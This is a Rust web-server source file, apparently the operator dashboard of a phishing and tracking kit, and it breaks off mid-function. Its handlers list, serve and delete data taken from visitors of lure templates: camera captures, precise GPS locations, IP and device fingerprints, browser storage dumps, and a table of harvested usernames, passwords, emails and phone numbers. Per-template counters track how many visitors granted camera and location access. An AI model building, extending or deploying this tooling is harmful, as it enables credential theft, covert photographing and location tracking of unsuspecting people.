use crate::AppState;
use axum::extract::{Path, Query, State};
use axum::http::header;
use axum::http::StatusCode;
use axum::response::Response;
use axum::Json;
use serde::{Deserialize, Serialize};
use std::sync::Arc;

#[derive(Serialize)]
pub struct Stats {
    total_captures: i64,
    total_locations: i64,
    total_ips: i64,
    unique_ips: i64,
    total_size_bytes: i64,
    total_size_mb: f64,
    first_capture: Option<i64>,
    last_capture: Option<i64>,
    total_credentials: i64,
    total_storage_dumps: i64,
}

#[derive(Serialize)]
pub struct CaptureRow {
    id: String,
    session_id: String,
    filename: String,
    file_type: String,
    file_size: i64,
    created_at: i64,
    url: String,
}

#[derive(Deserialize)]
pub struct CaptureQuery {
    #[serde(default = "default_page")]
    page: i64,
    #[serde(default = "default_per_page")]
    per_page: i64,
    sort: Option<String>,
    session: Option<String>,
}

fn default_page() -> i64 { 1 }
fn default_per_page() -> i64 { 60 }

#[derive(Serialize)]
pub struct PaginatedCaptures {
    captures: Vec<CaptureRow>,
    total: i64,
    page: i64,
    per_page: i64,
    pages: i64,
}

#[derive(Serialize)]
pub struct LocationRow {
    id: String,
    session_id: String,
    latitude: f64,
    longitude: f64,
    accuracy: Option<f64>,
    address: Option<String>,
    created_at: i64,
    maps_url: String,
}

#[derive(Serialize)]
pub struct IpRow {
    id: String,
    session_id: String,
    ip_address: String,
    user_agent: Option<String>,
    device: Option<String>,
    browser: Option<String>,
    os: Option<String>,
    city: Option<String>,
    country: Option<String>,
    local_ip: Option<String>,
    created_at: i64,
}

#[derive(Serialize)]
pub struct IpStats {
    entries: Vec<IpRow>,
    total: i64,
    unique_ips: i64,
    has_more: bool,
    device_breakdown: serde_json::Value,
    browser_breakdown: serde_json::Value,
    os_breakdown: serde_json::Value,
}

#[derive(Serialize)]
pub struct TemplateInfo {
    id: String,
    name: String,
    description: Option<String>,
    total_served: i64,
    total_camera_grants: i64,
    total_location_grants: i64,
    created_at: i64,
}

#[derive(Serialize)]
pub struct SessionInfo {
    id: String,
    name: String,
    template_id: String,
    status: String,
    created_at: i64,
}

#[derive(Deserialize)]
pub struct CreateSession {
    name: String,
    template_id: Option<String>,
}

#[derive(Serialize)]
pub struct Paginated<T: Serialize> {
    pub entries: Vec<T>,
    pub total: i64,
    pub has_more: bool,
}

pub async fn get_stats(State(state): State<Arc<AppState>>) -> Result<Json<Stats>, StatusCode> {
    let total_captures: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM captures")
        .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let total_locations: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM locations")
        .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let total_ips: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM ip_logs")
        .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let unique_ips: i64 = sqlx::query_scalar("SELECT COUNT(DISTINCT ip_address) FROM ip_logs")
        .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let total_size_bytes: i64 = sqlx::query_scalar("SELECT COALESCE(SUM(file_size),0) FROM captures")
        .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let (first_capture, last_capture): (Option<i64>, Option<i64>) =
        sqlx::query_as("SELECT MIN(created_at), MAX(created_at) FROM captures")
            .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let total_credentials: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM credentials")
        .fetch_one(&state.pool).await.unwrap_or(0);
    let total_storage_dumps: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM storage_dumps")
        .fetch_one(&state.pool).await.unwrap_or(0);

    Ok(Json(Stats {
        total_captures, total_locations, total_ips, unique_ips,
        total_size_bytes, total_size_mb: (total_size_bytes as f64) / 1_048_576.0,
        first_capture, last_capture,
        total_credentials, total_storage_dumps,
    }))
}

pub async fn list_captures(
    State(state): State<Arc<AppState>>,
    Query(q): Query<CaptureQuery>,
) -> Result<Json<PaginatedCaptures>, StatusCode> {
    let offset = (q.page - 1).max(0) * q.per_page;
    let (total, rows) = if let Some(session) = &q.session {
        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM captures WHERE session_id = ?")
            .bind(session).fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let rows: Vec<(String, String, String, String, i64, i64)> = match q.sort.as_deref() {
            Some("oldest") => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures WHERE session_id = ? ORDER BY created_at ASC LIMIT ? OFFSET ?")
                .bind(session).bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
            Some("largest") => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures WHERE session_id = ? ORDER BY file_size DESC LIMIT ? OFFSET ?")
                .bind(session).bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
            Some("smallest") => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures WHERE session_id = ? ORDER BY file_size ASC LIMIT ? OFFSET ?")
                .bind(session).bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
            _ => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures WHERE session_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?")
                .bind(session).bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
        }.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        (total, rows)
    } else {
        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM captures")
            .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let rows: Vec<(String, String, String, String, i64, i64)> = match q.sort.as_deref() {
            Some("oldest") => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures ORDER BY created_at ASC LIMIT ? OFFSET ?")
                .bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
            Some("largest") => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures ORDER BY file_size DESC LIMIT ? OFFSET ?")
                .bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
            Some("smallest") => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures ORDER BY file_size ASC LIMIT ? OFFSET ?")
                .bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
            _ => sqlx::query_as("SELECT id, session_id, filename, file_type, file_size, created_at FROM captures ORDER BY created_at DESC LIMIT ? OFFSET ?")
                .bind(q.per_page).bind(offset).fetch_all(&state.pool).await,
        }.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        (total, rows)
    };

    let captures: Vec<CaptureRow> = rows.into_iter().map(|(id, session_id, filename, file_type, file_size, created_at)| {
        let url = format!("/api/captures/{}/file", id);
        CaptureRow { id, session_id, filename, file_type, file_size, created_at, url }
    }).collect();

    let pages = if total > 0 { (total + q.per_page - 1) / q.per_page } else { 0 };

    Ok(Json(PaginatedCaptures { captures, total, page: q.page, per_page: q.per_page, pages }))
}

pub async fn get_capture(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    let row: Option<(String, String, String, String, i64, i64)> = sqlx::query_as(
        "SELECT id, session_id, filename, file_type, file_size, created_at FROM captures WHERE id = ?"
    ).bind(&id).fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    match row {
        Some((id, session_id, filename, file_type, file_size, created_at)) => {
            Ok(Json(serde_json::json!({
                "id": id, "session_id": session_id, "filename": filename,
                "file_type": file_type, "file_size": file_size, "created_at": created_at,
                "url": format!("/api/captures/{}/file", id)
            })))
        }
        None => Err(StatusCode::NOT_FOUND),
    }
}

pub async fn serve_capture_file(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<Response, StatusCode> {
    let row: Option<(String, String)> = sqlx::query_as(
        "SELECT file_path, file_type FROM captures WHERE id = ?"
    ).bind(&id).fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    match row {
        Some((file_path, file_type)) => {
            let data = tokio::fs::read(&file_path).await.map_err(|_| StatusCode::NOT_FOUND)?;
            let mut resp = Response::new(data.into());
            resp.headers_mut().insert(header::CONTENT_TYPE, file_type.parse().unwrap_or("application/octet-stream".parse().unwrap()));
            resp.headers_mut().insert(header::CACHE_CONTROL, "public, max-age=3600".parse().unwrap());
            Ok(resp)
        }
        None => Err(StatusCode::NOT_FOUND),
    }
}

pub async fn delete_capture(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<StatusCode, StatusCode> {
    let row: Option<(String, String)> = sqlx::query_as("SELECT file_path, session_id FROM captures WHERE id = ?")
        .bind(&id).fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    if let Some((file_path, session_id)) = row {
        let _ = tokio::fs::remove_file(&file_path).await;
        sqlx::query("DELETE FROM captures WHERE id = ?").bind(&id)
            .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let _ = sqlx::query(
            "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
        )
        .bind(uuid::Uuid::new_v4().to_string())
        .bind("dashboard")
        .bind("delete")
        .bind("capture")
        .bind(&id)
        .bind(&session_id)
        .bind("")
        .bind(chrono::Utc::now().timestamp())
        .execute(&state.pool).await;
        Ok(StatusCode::NO_CONTENT)
    } else {
        Err(StatusCode::NOT_FOUND)
    }
}

pub async fn delete_all_captures(State(state): State<Arc<AppState>>) -> Result<StatusCode, StatusCode> {
    let rows: Vec<(String,)> = sqlx::query_as("SELECT file_path FROM captures")
        .fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    for (file_path,) in &rows { let _ = tokio::fs::remove_file(file_path).await; }
    sqlx::query("DELETE FROM captures").execute(&state.pool).await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let _ = sqlx::query(
        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(uuid::Uuid::new_v4().to_string())
    .bind("dashboard")
    .bind("delete")
    .bind("capture")
    .bind(None::<String>)
    .bind(None::<String>)
    .bind("")
    .bind(chrono::Utc::now().timestamp())
    .execute(&state.pool).await;
    Ok(StatusCode::NO_CONTENT)
}

#[derive(Deserialize)]
pub struct ListQuery {
    session: Option<String>,
    offset: Option<i64>,
    limit: Option<i64>,
}

async fn get_breakdown(pool: &sqlx::SqlitePool, col: &str) -> serde_json::Value {
    let (query, _col_name) = match col {
        "device" => ("SELECT device, COUNT(*) as cnt FROM ip_logs WHERE device IS NOT NULL GROUP BY device ORDER BY cnt DESC", "device"),
        "browser" => ("SELECT browser, COUNT(*) as cnt FROM ip_logs WHERE browser IS NOT NULL GROUP BY browser ORDER BY cnt DESC", "browser"),
        "os" => ("SELECT os, COUNT(*) as cnt FROM ip_logs WHERE os IS NOT NULL GROUP BY os ORDER BY cnt DESC", "os"),
        _ => return serde_json::json!({}),
    };
    let rows: Result<Vec<(Option<String>, i64)>, _> = sqlx::query_as(query).fetch_all(pool).await;
    match rows {
        Ok(data) => serde_json::json!(data.into_iter().map(|(k, v)| (k.unwrap_or_default(), v)).collect::<std::collections::HashMap<_, _>>()),
        Err(_) => serde_json::json!({}),
    }
}

pub async fn list_ips(
    State(state): State<Arc<AppState>>,
    Query(q): Query<ListQuery>,
) -> Result<Json<IpStats>, StatusCode> {
    let limit = q.limit.unwrap_or(50).min(500);
    let offset = q.offset.unwrap_or(0);

    let (rows, total, unique_ips) = if let Some(session) = &q.session {
        let rows: Vec<(String, String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)> =
            sqlx::query_as(
                "SELECT id, session_id, ip_address, user_agent, device, browser, os, city, country, geo_data, created_at FROM ip_logs WHERE session_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?"
            ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM ip_logs WHERE session_id = ?")
            .bind(session).fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let unique_ips: i64 = sqlx::query_scalar("SELECT COUNT(DISTINCT ip_address) FROM ip_logs WHERE session_id = ?")
            .bind(session).fetch_one(&state.pool).await.unwrap_or(0);
        (rows, total, unique_ips)
    } else {
        let rows: Vec<(String, String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)> =
            sqlx::query_as(
                "SELECT id, session_id, ip_address, user_agent, device, browser, os, city, country, geo_data, created_at FROM ip_logs ORDER BY created_at DESC LIMIT ? OFFSET ?"
            ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM ip_logs")
            .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let unique_ips: i64 = sqlx::query_scalar("SELECT COUNT(DISTINCT ip_address) FROM ip_logs")
            .fetch_one(&state.pool).await.unwrap_or(0);
        (rows, total, unique_ips)
    };

    let entries: Vec<IpRow> = rows.into_iter().map(|(id, session_id, ip_address, user_agent, device, browser, os, city, country, geo_data, created_at)| {
        let local_ip = geo_data.as_ref()
            .and_then(|g| serde_json::from_str::<serde_json::Value>(g).ok())
            .and_then(|v| v.get("client_ip").and_then(|c| c.as_str().map(|s| s.to_string())));
        IpRow { id, session_id, ip_address, user_agent, device, browser, os, city, country, local_ip, created_at }
    }).collect();

    let has_more = (offset + limit) < total;
    let device_breakdown = get_breakdown(&state.pool, "device").await;
    let browser_breakdown = get_breakdown(&state.pool, "browser").await;
    let os_breakdown = get_breakdown(&state.pool, "os").await;

    Ok(Json(IpStats { entries, total, unique_ips, has_more, device_breakdown, browser_breakdown, os_breakdown }))
}

pub async fn list_locations(
    State(state): State<Arc<AppState>>,
    Query(q): Query<ListQuery>,
) -> Result<Json<Paginated<LocationRow>>, StatusCode> {
    let limit = q.limit.unwrap_or(50).min(500);
    let offset = q.offset.unwrap_or(0);
    let (rows, total) = if let Some(session) = &q.session {
        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM locations WHERE session_id = ?")
            .bind(session).fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let rows = sqlx::query_as::<_, (String, String, f64, f64, Option<f64>, Option<String>, i64)>(
            "SELECT id, session_id, latitude, longitude, accuracy, address, created_at FROM locations WHERE session_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?"
        ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        (rows, total)
    } else {
        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM locations")
            .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let rows = sqlx::query_as::<_, (String, String, f64, f64, Option<f64>, Option<String>, i64)>(
            "SELECT id, session_id, latitude, longitude, accuracy, address, created_at FROM locations ORDER BY created_at DESC LIMIT ? OFFSET ?"
        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        (rows, total)
    };

    let entries: Vec<LocationRow> = rows.into_iter().map(|(id, session_id, lat, lon, acc, address, created_at)| {
        let maps_url = format!("https://www.google.com/maps/place/{},{}", lat, lon);
        LocationRow { id, session_id, latitude: lat, longitude: lon, accuracy: acc, address, created_at, maps_url }
    }).collect();

    let has_more = (offset + limit) < total;
    Ok(Json(Paginated { entries, total, has_more }))
}

pub async fn list_templates(State(state): State<Arc<AppState>>) -> Result<Json<Vec<TemplateInfo>>, StatusCode> {
    let rows: Vec<(String, String, Option<String>, i64, i64, i64, i64)> = sqlx::query_as(
        "SELECT id, name, description, total_served, total_camera_grants, total_location_grants, created_at FROM templates ORDER BY name"
    ).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let templates: Vec<TemplateInfo> = rows.into_iter().map(|(id, name, description, total_served, total_camera_grants, total_location_grants, created_at)| {
        TemplateInfo { id, name, description, total_served, total_camera_grants, total_location_grants, created_at }
    }).collect();

    Ok(Json(templates))
}

#[derive(Serialize)]
pub struct EventRow {
    id: String,
    session_id: String,
    event_type: String,
    event_data: Option<serde_json::Value>,
    created_at: i64,
}

pub async fn list_events(
    State(state): State<Arc<AppState>>,
    Query(q): Query<EventQuery>,
) -> Result<Json<Paginated<EventRow>>, StatusCode> {
    let limit = q.limit.unwrap_or(50).min(500);
    let offset = q.offset.unwrap_or(0);
    let (rows, total) = if let Some(session) = &q.session {
        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events WHERE session_id = ?")
            .bind(session).fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let rows: Vec<(String, String, String, Option<String>, i64)> = sqlx::query_as(
            "SELECT id, session_id, event_type, event_data, created_at FROM events WHERE session_id = ? ORDER BY created_at ASC LIMIT ? OFFSET ?"
        ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        (rows, total)
    } else {
        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events")
            .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let rows: Vec<(String, String, String, Option<String>, i64)> = sqlx::query_as(
            "SELECT id, session_id, event_type, event_data, created_at FROM events ORDER BY created_at ASC LIMIT ? OFFSET ?"
        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        (rows, total)
    };

    let entries: Vec<EventRow> = rows.into_iter().map(|(id, session_id, event_type, event_data, created_at)| {
        let parsed_data = event_data.and_then(|d| serde_json::from_str(&d).ok());
        EventRow { id, session_id, event_type, event_data: parsed_data, created_at }
    }).collect();

    let has_more = (offset + limit) < total;
    Ok(Json(Paginated { entries, total, has_more }))
}

#[derive(Deserialize)]
pub struct EventQuery {
    session: Option<String>,
    offset: Option<i64>,
    limit: Option<i64>,
}

pub async fn list_sessions(State(state): State<Arc<AppState>>) -> Result<Json<Vec<SessionInfo>>, StatusCode> {
    let rows: Vec<(String, String, String, String, i64)> = sqlx::query_as(
        "SELECT id, name, template_id, status, created_at FROM sessions ORDER BY created_at DESC"
    ).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let sessions: Vec<SessionInfo> = rows.into_iter().map(|(id, name, template_id, status, created_at)| {
        SessionInfo { id, name, template_id, status, created_at }
    }).collect();

    Ok(Json(sessions))
}

pub async fn create_session(
    State(state): State<Arc<AppState>>,
    Json(body): Json<CreateSession>,
) -> Result<Json<SessionInfo>, StatusCode> {
    let id = uuid::Uuid::new_v4().to_string();
    let template_id = body.template_id.unwrap_or_else(|| "face-runner".into());
    let now = chrono::Utc::now().timestamp();

    sqlx::query("INSERT INTO sessions (id, name, template_id, status, created_at) VALUES (?, ?, ?, 'active', ?)")
        .bind(&id).bind(&body.name).bind(&template_id).bind(now)
        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    state.posthog.capture_session_created(&body.name, &template_id).await;

    Ok(Json(SessionInfo { id, name: body.name, template_id, status: "active".into(), created_at: now }))
}

pub async fn get_session(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<Json<SessionInfo>, StatusCode> {
    let row: Option<(String, String, String, String, i64)> = sqlx::query_as(
        "SELECT id, name, template_id, status, created_at FROM sessions WHERE id = ?"
    ).bind(&id).fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    match row {
        Some((id, name, template_id, status, created_at)) => {
            Ok(Json(SessionInfo { id, name, template_id, status, created_at }))
        }
        None => Err(StatusCode::NOT_FOUND),
    }
}

pub async fn delete_session(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<StatusCode, StatusCode> {
    if id == "default" { return Err(StatusCode::FORBIDDEN); }

    let mut tx = state.pool.begin().await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    sqlx::query("DELETE FROM captures WHERE session_id = ?").bind(&id).execute(&mut *tx).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    sqlx::query("DELETE FROM ip_logs WHERE session_id = ?").bind(&id).execute(&mut *tx).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    sqlx::query("DELETE FROM locations WHERE session_id = ?").bind(&id).execute(&mut *tx).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    sqlx::query("DELETE FROM events WHERE session_id = ?").bind(&id).execute(&mut *tx).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    sqlx::query("DELETE FROM credentials WHERE session_id = ?").bind(&id).execute(&mut *tx).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    sqlx::query("DELETE FROM storage_dumps WHERE session_id = ?").bind(&id).execute(&mut *tx).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    sqlx::query("DELETE FROM sessions WHERE id = ?").bind(&id).execute(&mut *tx).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    tx.commit().await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    let _ = sqlx::query(
        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(uuid::Uuid::new_v4().to_string())
    .bind("dashboard")
    .bind("delete")
    .bind("session")
    .bind(&id)
    .bind(&id)
    .bind("")
    .bind(chrono::Utc::now().timestamp())
    .execute(&state.pool).await;
    Ok(StatusCode::NO_CONTENT)
}

#[derive(Serialize)]
pub struct CredentialRow {
    id: String,
    session_id: String,
    template_id: Option<String>,
    username: Option<String>,
    password: Option<String>,
    email: Option<String>,
    phone: Option<String>,
    ip_address: Option<String>,
    created_at: i64,
}

pub async fn list_credentials(
    State(state): State<Arc<AppState>>,
    Query(q): Query<ListQuery>,
) -> Result<Json<Paginated<CredentialRow>>, StatusCode> {
    let limit = q.limit.unwrap_or(50).min(500);
    let offset = q.offset.unwrap_or(0);
    let (rows, total) = if let Some(session) = &q.session {
        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM credentials WHERE session_id = ?")
            .bind(session).fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let rows = sqlx::query_as::<_, (String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)>(
            "SELECT id, session_id, template_id, username, password, email, phone, ip_address, created_at FROM credentials WHERE session_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?"
        ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        (rows, total)
    } else {
        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM credentials")
            .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let rows = sqlx::query_as::<_, (String, String, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, Option<String>, i64)>(
            "SELECT id, session_id, template_id, username, password, email, phone, ip_address, created_at FROM credentials ORDER BY created_at DESC LIMIT ? OFFSET ?"
        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        (rows, total)
    };

    let entries: Vec<CredentialRow> = rows.into_iter().map(|(id, session_id, template_id, username, password, email, phone, ip_address, created_at)| {
        CredentialRow { id, session_id, template_id, username, password, email, phone, ip_address, created_at }
    }).collect();

    let has_more = (offset + limit) < total;
    Ok(Json(Paginated { entries, total, has_more }))
}

#[derive(Serialize)]
pub struct StorageRow {
    id: String,
    session_id: String,
    ip_address: Option<String>,
    data: Option<serde_json::Value>,
    created_at: i64,
}

pub async fn list_storage(
    State(state): State<Arc<AppState>>,
    Query(q): Query<ListQuery>,
) -> Result<Json<Paginated<StorageRow>>, StatusCode> {
    let limit = q.limit.unwrap_or(50).min(500);
    let offset = q.offset.unwrap_or(0);
    let (rows, total) = if let Some(session) = &q.session {
        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM storage_dumps WHERE session_id = ?")
            .bind(session).fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let rows = sqlx::query_as::<_, (String, String, Option<String>, Option<String>, i64)>(
            "SELECT id, session_id, data, ip_address, created_at FROM storage_dumps WHERE session_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?"
        ).bind(session).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        (rows, total)
    } else {
        let total: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM storage_dumps")
            .fetch_one(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let rows = sqlx::query_as::<_, (String, String, Option<String>, Option<String>, i64)>(
            "SELECT id, session_id, data, ip_address, created_at FROM storage_dumps ORDER BY created_at DESC LIMIT ? OFFSET ?"
        ).bind(limit).bind(offset).fetch_all(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        (rows, total)
    };

    let entries: Vec<StorageRow> = rows.into_iter().map(|(id, session_id, data, ip_address, created_at)| {
        let parsed = data.and_then(|d| serde_json::from_str(&d).ok());
        StorageRow { id, session_id, ip_address, data: parsed, created_at }
    }).collect();

    let has_more = (offset + limit) < total;
    Ok(Json(Paginated { entries, total, has_more }))
}

pub async fn delete_credential(
    State(state): State<Arc<AppState>>,
    Path(id): Path<String>,
) -> Result<StatusCode, StatusCode> {
    let row: Option<(String,)> = sqlx::query_as("SELECT session_id FROM credentials WHERE id = ?")
        .bind(&id).fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    if let Some((session_id,)) = row {
        sqlx::query("DELETE FROM credentials WHERE id = ?").bind(&id)
            .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
        let _ = sqlx::query(
            "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
        )
        .bind(uuid::Uuid::new_v4().to_string())
        .bind("dashboard")
        .bind("delete")
        .bind("credential")
        .bind(&id)
        .bind(&session_id)
        .bind("")
        .bind(chrono::Utc::now().timestamp())
        .execute(&state.pool).await;
        Ok(StatusCode::NO_CONTENT)
    } else {
        Err(StatusCode::NOT_FOUND)
    }
}

pub async fn delete_all_credentials(State(state): State<Arc<AppState>>) -> Result<StatusCode, StatusCode> {
    sqlx::query("DELETE FROM credentials")
        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let _ = sqlx::query(
        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(uuid::Uuid::new_v4().to_string())
    .bind("dashboard")
    .bind("delete")
    .bind("credential")
    .bind(None::<String>)
    .bind(None::<String>)
    .bind("")
    .bind(chrono::Utc::now().timestamp())
    .execute(&state.pool).await;
    Ok(StatusCode::NO_CONTENT)
}

pub async fn delete_all_ips(State(state): State<Arc<AppState>>) -> Result<StatusCode, StatusCode> {
    sqlx::query("DELETE FROM ip_logs")
        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let _ = sqlx::query(
        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(uuid::Uuid::new_v4().to_string())
    .bind("dashboard")
    .bind("delete")
    .bind("ip_logs")
    .bind(None::<String>)
    .bind(None::<String>)
    .bind("")
    .bind(chrono::Utc::now().timestamp())
    .execute(&state.pool).await;
    Ok(StatusCode::NO_CONTENT)
}

pub async fn delete_all_locations(State(state): State<Arc<AppState>>) -> Result<StatusCode, StatusCode> {
    sqlx::query("DELETE FROM locations")
        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let _ = sqlx::query(
        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(uuid::Uuid::new_v4().to_string())
    .bind("dashboard")
    .bind("delete")
    .bind("locations")
    .bind(None::<String>)
    .bind(None::<String>)
    .bind("")
    .bind(chrono::Utc::now().timestamp())
    .execute(&state.pool).await;
    Ok(StatusCode::NO_CONTENT)
}

pub async fn delete_all_events(State(state): State<Arc<AppState>>) -> Result<StatusCode, StatusCode> {
    sqlx::query("DELETE FROM events")
        .execute(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let _ = sqlx::query(
        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
